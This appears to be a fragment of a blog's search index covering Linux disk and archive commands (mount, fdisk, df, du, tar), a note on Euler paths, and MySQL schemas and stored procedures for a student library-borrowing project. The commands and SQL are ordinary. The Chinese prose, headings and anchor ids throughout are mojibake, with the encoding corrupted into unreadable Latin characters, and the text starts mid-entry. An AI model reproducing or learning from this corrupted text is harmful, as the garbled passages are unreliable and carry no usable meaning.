<h2 id="æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ"><a href="#æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ"></a>æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ</h2><h3 id="fdiskå‘½ä»¤"><a href="#fdiskå‘½ä»¤" class="headerlink" title="fdiskå‘½ä»¤"></a>fdiskå‘½ä»¤</h3><p>fdiskå‘½ä»¤ç”¨äºè§‚å¯Ÿç¡¬ç›˜å®ä½“ä½¿ç”¨æƒ…å†µï¼Œä¹Ÿå¯å¯¹ç¡¬ç›˜åˆ†åŒºã€‚å®ƒé‡‡ç”¨ä¼ ç»Ÿçš„é—®ç­”å¼ç•Œé¢ï¼Œè€Œéç±»ä¼¼DOS fdiskçš„cfdiskäº’åŠ¨å¼æ“ä½œç•Œé¢ï¼Œå› æ­¤åœ¨ä½¿ç”¨ä¸Šè¾ƒä¸ºä¸ä¾¿ï¼Œä½†åŠŸèƒ½å´ä¸æ¯«ä¸æ‰“æŠ˜æ‰£ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fdisk(é€‰é¡¹)(å‚æ•°)</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-b&lt;åˆ†åŒºå¤§å°&gt;</td>
<td>æŒ‡å®šæ¯ä¸ªåˆ†åŒºçš„å¤§å°</td>
</tr>
<tr>
<td>-l</td>
<td>åˆ—å‡ºæŒ‡å®šçš„å¤–å›´è®¾å¤‡çš„åˆ†åŒºè¡¨çŠ¶å†µ</td>
</tr>
<tr>
<td>-s&lt;åˆ†åŒºç¼–å·&gt;</td>
<td>å°†æŒ‡å®šçš„åˆ†åŒºå¤§å°è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼Œå•ä½ä¸ºåŒºå—</td>
</tr>
<tr>
<td>-u</td>
<td>æ­é…â€-lâ€å‚æ•°åˆ—è¡¨ï¼Œä¼šç”¨åˆ†åŒºæ•°ç›®å–ä»£æŸ±é¢æ•°ç›®ï¼Œæ¥è¡¨ç¤ºæ¯ä¸ªåˆ†åŒºçš„èµ·å§‹åœ°å€</td>
</tr>
<tr>
<td>-v</td>
<td>æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯</td>
</tr>
</tbody></table>
<p>å‚æ•°ï¼šæŒ‡å®šè¦è¿›è¡Œåˆ†åŒºæˆ–è€…æ˜¾ç¤ºåˆ†åŒºçš„ç¡¬ç›˜è®¾å¤‡æ–‡ä»¶ã€‚</p>
<h3 id="æŒ‚è½½å‘½ä»¤"><a href="#æŒ‚è½½å‘½ä»¤" class="headerlink" title="æŒ‚è½½å‘½ä»¤"></a>æŒ‚è½½å‘½ä»¤</h3><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount [é€‰é¡¹] è®¾å¤‡ å­˜æ”¾ç›®å½•</span></span><br></pre></td></tr></table></figure>

<p>è¯¥å‘½ä»¤å¯ä»¥å°†Linuxæ”¯æŒçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°æŒ‡å®šçš„ç›®å½•ã€‚å¸¸ç”¨é€‰é¡¹å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>å¸¸ç”¨é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>æŒ‚ä¸Š/etc/fstabä¸‹åˆ—å‡ºçš„å…¨éƒ¨æ–‡ä»¶ç³»ç»Ÿ</td>
</tr>
<tr>
<td>-t</td>
<td>æŒ‡å®šæŒ‚ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿçš„åç§°</td>
</tr>
<tr>
<td>-n</td>
<td>æŒ‚ä¸Šæ–‡ä»¶ç³»ç»Ÿæ—¶ä¸æŠŠæ–‡ä»¶ç³»ç»Ÿçš„æ•°æ®å†™å…¥/etc/mtabä¸­</td>
</tr>
<tr>
<td>-w</td>
<td>å°†æ–‡ä»¶ç³»ç»Ÿè®¾å®šä¸ºå¯è¯»å†™</td>
</tr>
</tbody></table>
<h3 id="æŒ‚è½½è½¯ç›˜"><a href="#æŒ‚è½½è½¯ç›˜" class="headerlink" title="æŒ‚è½½è½¯ç›˜"></a>æŒ‚è½½è½¯ç›˜</h3><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/fd0  /mnt/floppy</span></span><br></pre></td></tr></table></figure>
<p>äº‹å…ˆåœ¨/mnt/ç›®å½•ä¸‹å»ºç«‹floppyç›®å½•ï¼Œä¹‹åå°†è®¾å¤‡å·ä¸ºfd0çš„è½¯ç›˜æŒ‚è½½åˆ°è¯¥ç›®å½•ã€‚</p>
<h3 id="æŒ‚è½½Uç›˜"><a href="#æŒ‚è½½Uç›˜" class="headerlink" title="æŒ‚è½½Uç›˜"></a>æŒ‚è½½Uç›˜</h3><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/sda1  /mnt/usb</span></span><br></pre></td></tr></table></figure>
<p>åœ¨/mnt/ç›®å½•ä¸‹å»ºç«‹usbç›®å½•ï¼Œå°†è®¾å¤‡å·ä¸ºsda1çš„Uç›˜æŒ‚è½½åˆ°è¯¥ç›®å½•ã€‚</p>
<h3 id="æŒ‚è½½å…‰ç›˜"><a href="#æŒ‚è½½å…‰ç›˜" class="headerlink" title="æŒ‚è½½å…‰ç›˜"></a>æŒ‚è½½å…‰ç›˜</h3><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/cdrom  /mnt/cdrom</span></span><br></pre></td></tr></table></figure>
<p>åœ¨/mnt/ç›®å½•ä¸‹å»ºç«‹cdromç›®å½•ï¼Œå°†è®¾å¤‡åä¸ºcdromçš„å…‰ç›˜æŒ‚è½½åˆ°è¯¥ç›®å½•ã€‚</p>
<h3 id="å¸è½½å‘½ä»¤"><a href="#å¸è½½å‘½ä»¤" class="headerlink" title="å¸è½½å‘½ä»¤"></a>å¸è½½å‘½ä»¤</h3><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> umount è®¾å¤‡</span></span><br></pre></td></tr></table></figure>
<p>è¯¥å‘½ä»¤å¯å°†å·²ç»æŒ‚è½½çš„æŒ‡å®šè®¾å¤‡è¿›è¡Œå¸è½½ã€‚æŸäº›è®¾å¤‡ï¼Œå¦‚å…‰ç›˜ï¼Œè‹¥ä¸å¸è½½å°†æ— æ³•å–å‡ºã€‚</p>
<h2 id="ç£ç›˜ç®¡ç†"><a href="#ç£ç›˜ç®¡ç†" class="headerlink" title="ç£ç›˜ç®¡ç†"></a>ç£ç›˜ç®¡ç†</h2><h3 id="æŸ¥çœ‹ç£ç›˜ç©ºé—´"><a href="#æŸ¥çœ‹ç£ç›˜ç©ºé—´" class="headerlink" title="æŸ¥çœ‹ç£ç›˜ç©ºé—´"></a>æŸ¥çœ‹ç£ç›˜ç©ºé—´</h3><p>æŸ¥çœ‹ç£ç›˜å¤§å°å’Œåˆ©ç”¨ç‡ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> df -h</span></span><br></pre></td></tr></table></figure>

<p><code>-h</code>æ˜¯ä»¥æ˜“è¯»çš„æ–¹å‘æ˜¾ç°ï¼Œè‡ªåŠ¨æ›´æ”¹å•ä½ï¼Œå³GB/MB/KBï¼Œä¸åŠ è¯¥é€‰é¡¹åˆ™ä»¥Bä¸ºå•ä½æ˜¾ç¤ºã€‚</p>
<p>æŸ¥çœ‹å½“å‰ç›®å½•å ç”¨ç©ºé—´å¤§å°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> du -sh</span></span><br></pre></td></tr></table></figure>

<p><code>-s</code>æ˜¯é€’å½’æ•´ä¸ªç›®å½•å¤§å°</p>
<p>æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹å„ä¸ªæ–‡ä»¶çš„å¤§å°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> du -sh *</span></span><br></pre></td></tr></table></figure>

<h3 id="æ‰“åŒ…å’Œå‹ç¼©"><a href="#æ‰“åŒ…å’Œå‹ç¼©" class="headerlink" title="æ‰“åŒ…å’Œå‹ç¼©"></a>æ‰“åŒ…å’Œå‹ç¼©</h3><p> æ‰“åŒ…æ˜¯æŒ‡å°†å‡ ä¸ªæ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ï¼Œå‹ç¼©åˆ™æ˜¯å°†ä¸€ä¸ªå¤§çš„æ–‡ä»¶é€šè¿‡ä¸€äº›å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ </p>
<ul>
<li><p>æ‰“åŒ…</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>äº§ç”Ÿæ–°çš„åŒ…</td>
</tr>
<tr>
<td>-f</td>
<td>æŒ‡å®šåŒ…çš„æ–‡ä»¶å</td>
</tr>
<tr>
<td>-r</td>
<td>æŒ‡å®šæ–°æ–‡ä»¶åŠ å…¥åˆ°åŒ…ä¸­</td>
</tr>
<tr>
<td>-t</td>
<td>åˆ—å‡ºåŒ…ä¸­æ–‡ä»¶</td>
</tr>
<tr>
<td>-u</td>
<td>æ›´æ–°åŒ…ä¸­æŸä¸ªæ–‡ä»¶</td>
</tr>
<tr>
<td>-v</td>
<td>æ˜¾ç¤ºè¿›åº¦</td>
</tr>
</tbody></table>
<p>ä¾‹å¦‚ï¼šæ‰“åŒ…å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰çš„<code>txt</code>æ–‡ä»¶å¹¶æ˜¾ç¤ºè¿›åº¦ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -cvf new.tar *.txt</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å‹ç¼©ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gzip new.tar</span></span><br></pre></td></tr></table></figure>

<p>å°†ä¼šç”Ÿæˆ<code>new.tar.gz</code>çš„æ–‡ä»¶ã€‚</p>
</li>
</ul>
<p>ä¹Ÿå¯ä»¥ä¸€æ¡å‘½ä»¤å°†æ–‡ä»¶æ‰“åŒ…å¹¶å‹ç¼©ï¼š</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -cvzf one.tar.gz *.txt</span></span><br></pre></td></tr></table></figure>

<p>  <code>-z</code>æ˜¯è°ƒç”¨<code>gzip</code></p>
<h3 id="è§£å‹ç¼©å’Œè§£åŒ…"><a href="#è§£å‹ç¼©å’Œè§£åŒ…" class="headerlink" title="è§£å‹ç¼©å’Œè§£åŒ…"></a>è§£å‹ç¼©å’Œè§£åŒ…</h3><ul>
<li><p>è§£å‹ç¼©</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gunzip one.tar.gz</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>è§£åŒ…</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -xf one.tar</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>è¿™é‡ŒåŒæ ·æ”¯æŒä¸€æ¡å‘½ä»¤å°†å‹ç¼©åŒ…è§£å‹å¹¶è§£åŒ…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -xzf one.tar.gz</span></span><br></pre></td></tr></table></figure>

<p>é™¤äº†<code>gzip</code>ï¼Œè¿˜å¯ä»¥ç”¨<code>bz2</code>ã€‚ç”¨æ³•å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>è°ƒç”¨æ–¹å¼</th>
<th>å¯¹åº”å‹ç¼©åŒ…æ–‡ä»¶</th>
</tr>
</thead>
<tbody><tr>
<td>gzip</td>
<td>-z</td>
<td>.gz</td>
</tr>
<tr>
<td>bzip2</td>
<td>-j</td>
<td>.bz2</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Linuxç›¸å…³</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>å›¾è®ºä¹‹æ¬§æ‹‰è·¯</title>
    <url>/2021/04/25/%E5%9B%BE%E8%AE%BA%E4%B9%8B%E6%AC%A7%E6%8B%89%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="æ¬§æ‹‰è·¯"><a href="#æ¬§æ‹‰è·¯" class="headerlink" title="æ¬§æ‹‰è·¯"></a>æ¬§æ‹‰è·¯</h2><blockquote>
<p>ç»™å®šæ— å­¤ç«‹èŠ‚ç‚¹å›¾<code>G</code>ï¼Œè‹¥å­˜åœ¨ä¸€æ¡è·¯ï¼Œç»è¿‡å›¾ä¸­çš„æ¯ä¸€æ¡è¾¹ä¸€æ¬¡ä¸”ä»…ä¸€æ¬¡ï¼Œé‚£ä¹ˆè¯¥æ¡è·¯ç§°ä¸ºæ¬§æ‹‰è·¯ï¼Œå¦‚æœè¿™æ¡è·¯çš„èµ·ç‚¹å’Œç»ˆç‚¹ç›¸åŒï¼Œåˆ™è¯¥è·¯ç§°ä¸ºæ¬§æ‹‰å›è·¯ï¼Œå¦åˆ™ç§°ä¸ºæ¬§æ‹‰é€šè·¯ã€‚</p>
</blockquote>
<a id="more"></a>

<h3 id="æ— å‘å›¾"><a href="#æ— å‘å›¾" class="headerlink" title="æ— å‘å›¾"></a>æ— å‘å›¾</h3><p>æ— å‘å›¾ä¸­å…·æœ‰ä¸€æ¡æ¬§æ‹‰å›¾ï¼Œå½“ä¸”ä»…å½“è¯¥å›¾æ˜¯è¿é€šå›¾ä¸”æœ‰é›¶ä¸ªæˆ–è€…ä¸¤ä¸ªå¥‡æ•°åº¦çš„èŠ‚ç‚¹ï¼Œæ‰€æœ‰ç‚¹çš„åº¦éƒ½æ˜¯å¶æ•°çš„æ—¶å€™ï¼Œè¯¥å›¾æœ‰æ¬§æ‹‰å›è·¯ï¼Œæœ‰ä¸¤ä¸ªå¥‡æ•°åº¦çš„èŠ‚ç‚¹æ—¶ï¼Œæœ‰æ¬§æ‹‰é€šè·¯ã€‚</p>
<h3 id="æœ‰å‘å›¾"><a href="#æœ‰å‘å›¾" class="headerlink" title="æœ‰å‘å›¾"></a>æœ‰å‘å›¾</h3><p>æœ‰å‘å›¾å…·æœ‰æ¬§æ‹‰è·¯å½“ä¸”ä»…å½“è¯¥å›¾æ˜¯è¿é€šçš„ï¼Œè‹¥æ¯ä¸ªèŠ‚ç‚¹çš„å…¥åº¦ç­‰äºå‡ºåº¦ï¼Œåˆ™å­˜åœ¨æ¬§æ‹‰å›è·¯ï¼Œè‹¥å›¾ä¸­é™¤äº†ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹å¤–ï¼Œæ¯ä¸ªç‚¹çš„å…¥åº¦ç­‰äºå‡ºåº¦ï¼Œè€Œè¿™ä¸¤ä¸ªç‚¹ä¸­ä¸€ä¸ªç‚¹çš„å…¥åº¦æ¯”å‡ºåº¦å¤§<code>1</code>ï¼Œå¦å¤–ä¸€ä¸ªç‚¹çš„å‡ºåº¦æ¯”å…¥è¯»å¤§<code>1</code>ï¼Œåˆ™å­˜åœ¨æ¬§æ‹‰é€šè·¯ã€‚</p>
<h2 id="æ±‚è§£æ¬§æ‹‰è·¯"><a href="#æ±‚è§£æ¬§æ‹‰è·¯" class="headerlink" title="æ±‚è§£æ¬§æ‹‰è·¯"></a>æ±‚è§£æ¬§æ‹‰è·¯</h2><p>å½“åˆ¤æ–­å›¾ä¸­å…·æœ‰æ¬§æ‹‰è·¯åï¼Œå¯ä»¥æ ¹æ®æ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå¯¹æ¯ä¸€æ¡è¾¹è®¾ç½®è®¿é—®æ ‡è®°ï¼Œå½“æ‰¾åˆ°ä¸€æ¡æ¬§æ‹‰è·¯åç›´æ¥ç»“æŸæœç´¢ï¼Œå¦åˆ™æ ¹æ®å›æº¯æ€æƒ³ä¸æ–­è¿›è¡Œæœç´¢ã€‚</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å›¾è®º</tag>
      </tags>
  </entry>
  <entry>
    <title>å›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿ</title>
    <url>/2020/07/03/%E5%9B%BE%E4%B9%A6%E5%80%9F%E9%98%85%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://gitee.com/YaleXin/caozuoxitongkechengsheji" target="_blank" rel="noopener">gitee</a></p>
</blockquote>
<p>ä¸€æ¬¡æ•°æ®åº“è¯¾ç¨‹è®¾è®¡ï¼Œç³»ç»Ÿç•Œé¢ç”¨Cè¯­è¨€ï¼Œåå°æ•°æ®ç”¨<code>MySQL</code>ï¼ˆå¦‚æœä¸çŸ¥é“å¦‚ä½•ç”¨Cè¯­è¨€è¿æ¥<code>MySQL</code>,å‚ç…§æˆ‘çš„<a href="https://www.yalexin.top/index.php/archives/46/" target="_blank" rel="noopener">ä¸Šä¸€ç¯‡æ–‡ç« </a>ï¼‰ã€‚<a id="more"></a></p>
<h2 id="æ•°æ®åº“è®¾è®¡"><a href="#æ•°æ®åº“è®¾è®¡" class="headerlink" title="æ•°æ®åº“è®¾è®¡"></a>æ•°æ®åº“è®¾è®¡</h2><ul>
<li>E-Rå›¾</li>
</ul>
<p><img src="https://q.yalexin.top/%E6%80%BB%E4%BD%93er%E5%9B%BE.png" alt></p>
<ul>
<li><p>äº”å¼ è¡¨ï¼š</p>
<ol>
<li><p>ç”¨æˆ·è¡¨ï¼ˆ<u>ç¼–å·</u>ï¼Œå§“åï¼Œæ€§åˆ«ï¼Œå¹´é¾„ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;users&#96; (</span><br><span class="line">  &#96;PNO&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;PNAME&#96; varchar(20) NOT NULL,</span><br><span class="line">  &#96;GENDER&#96; enum(&#39;ç”·&#39;,&#39;å¥³&#39;) NOT NULL,</span><br><span class="line">  &#96;AGE&#96; int(20) DEFAULT &#39;18&#39;,</span><br><span class="line">  PRIMARY KEY (&#96;PNO&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¹¦ç±è¡¨ï¼ˆ<u>ç¼–å·</u>ï¼Œä¹¦åï¼Œåº“å­˜ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;books&#96; (</span><br><span class="line">   &#96;BNO&#96; int(11) NOT NULL,</span><br><span class="line">   &#96;BNAME&#96; varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,</span><br><span class="line">   &#96;BINVENTORY&#96; int(11) NOT NULL DEFAULT &#39;0&#39;,</span><br><span class="line">   PRIMARY KEY (&#96;BNO&#96;)</span><br><span class="line"> ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¹¦å•†è¡¨ï¼ˆ<u>ç¼–å·</u>ï¼Œä¹¦å•†åï¼Œåœ°å€ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;booksellers&#96; (</span><br><span class="line">  &#96;SNO&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;SNAME&#96; varchar(20) DEFAULT NULL,</span><br><span class="line">  &#96;ADDR&#96; varchar(50) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;SNO&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>å€Ÿé˜…è¡¨ï¼ˆ<u>ä¹¦ç±ç¼–å·</u>ï¼Œ<u>ç”¨æˆ·ç¼–å·</u>ï¼Œå€Ÿé˜…æ—¥æœŸï¼Œå½’è¿˜æ—¥æœŸï¼Œæ˜¯å¦å·²å½’è¿˜ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;borrowings&#96; (</span><br><span class="line">  &#96;BNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;PNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;BDATE&#96; timestamp NOT NULL DEFAULT &#39;0000-00-00 00:00:00&#39;,</span><br><span class="line">  &#96;RDATE&#96; timestamp NULL DEFAULT &#39;0000-00-00 00:00:00&#39;,</span><br><span class="line">  &#96;ISRETURN&#96; tinyint(1) DEFAULT &#39;0&#39;,</span><br><span class="line">  KEY &#96;borrowings_ibfk_1&#96; (&#96;PNO&#96;),</span><br><span class="line">  KEY &#96;borrowings_ibfk_2&#96; (&#96;BNO&#96;),</span><br><span class="line">  CONSTRAINT &#96;borrowings_ibfk_1&#96; FOREIGN KEY (&#96;PNO&#96;) REFERENCES &#96;users&#96; (&#96;PNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE,</span><br><span class="line">  CONSTRAINT &#96;borrowings_ibfk_2&#96; FOREIGN KEY (&#96;BNO&#96;) REFERENCES &#96;books&#96; (&#96;BNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8mb4</span><br></pre></td></tr></table></figure>
</li>
<li><p>å…¥åº“è¡¨ï¼ˆ<u>ä¹¦å•†ç¼–å·</u>ï¼Œ<u>ä¹¦ç±ç¼–å·</u>ï¼Œå…¥åº“æ•°é‡ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;warehousings&#96; (</span><br><span class="line">   &#96;SNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">   &#96;BNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">   &#96;NUM&#96; int(11) DEFAULT NULL,</span><br><span class="line">   KEY &#96;SNO&#96; (&#96;SNO&#96;),</span><br><span class="line">   KEY &#96;BNO&#96; (&#96;BNO&#96;),</span><br><span class="line">   CONSTRAINT &#96;warehousings_ibfk_1&#96; FOREIGN KEY (&#96;SNO&#96;) REFERENCES &#96;booksellers&#96; (&#96;SNO&#96;) ON UPDATE CASCADE,</span><br><span class="line">   CONSTRAINT &#96;warehousings_ibfk_2&#96; FOREIGN KEY (&#96;BNO&#96;) REFERENCES &#96;books&#96; (&#96;BNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE</span><br><span class="line"> ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>å­˜å‚¨è¿‡ç¨‹</p>
<ol>
<li><p>å€Ÿé˜…ï¼šæ ¹æ®ç”¨æˆ·IDå’Œä¹¦ç±IDï¼Œå½¢æˆå€Ÿé˜…å…³ç³»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;TRY_BORROW&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;TRY_BORROW&#96;(IN PNO INT, IN BNO INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;å€Ÿé˜…å¤±è´¥ï¼Œåº“å­˜ä¸è¶³æˆ–è€…ç¼–å·é”™è¯¯ï¼&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books </span><br><span class="line">    SET</span><br><span class="line">        BINVENTORY &#x3D; (BINVENTORY - 1) </span><br><span class="line">    WHERE books.&#96;BNO&#96; &#x3D; BNO ;</span><br><span class="line">    INSERT INTO borrowings (BNO, PNO, BDATE, ISRETURN) </span><br><span class="line">    VALUES</span><br><span class="line">        (BNO, PNO, NOW(), 0) ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å½’è¿˜ï¼šæ ¹æ®ç”¨æˆ·IDå’Œä¹¦ç±IDï¼Œä¿®æ”¹è®°å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;TRY_RETURN&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;TRY_RETURN&#96;(IN mPNO INT, IN mBNO INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;å½’è¿˜å¤±è´¥&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books,</span><br><span class="line">        borrowings </span><br><span class="line">    SET</span><br><span class="line">        books.&#96;BINVENTORY&#96; &#x3D; (books.&#96;BINVENTORY&#96; + 1) </span><br><span class="line">    WHERE books.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;PNO&#96; &#x3D; mPNO </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0 ;</span><br><span class="line">    UPDATE </span><br><span class="line">        borrowings </span><br><span class="line">    SET</span><br><span class="line">        borrowings.&#96;ISRETURN&#96; &#x3D; 1,</span><br><span class="line">        borrowings.&#96;RDATE&#96; &#x3D; NOW() </span><br><span class="line">    WHERE borrowings.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;PNO&#96; &#x3D; mPNO </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0 </span><br><span class="line">    LIMIT 1 ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å…¥åº“ï¼šæ ¹æ®ä¹¦å•†ç¼–å·å’Œä¹¦ç±ç¼–å·ï¼Œå°†å¯¹åº”çš„ä¹¦ç±åº“å­˜é‡è¿›è¡Œä¿®æ”¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;PUT_IN&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;PUT_IN&#96;(IN mbno INT, IN msno INT, IN mnum INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;å…¥åº“å¤±è´¥,ç¼–å·é”™è¯¯æˆ–è€…å…¥åº“æ•°é‡é”™è¯¯&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    INSERT INTO warehousings (BNO, SNO, NUM) </span><br><span class="line">    VALUES</span><br><span class="line">        (mbno, msno, mnum) ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books </span><br><span class="line">    SET</span><br><span class="line">        BINVENTORY &#x3D; (BINVENTORY + mnum) </span><br><span class="line">    WHERE BNO &#x3D; mbno ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
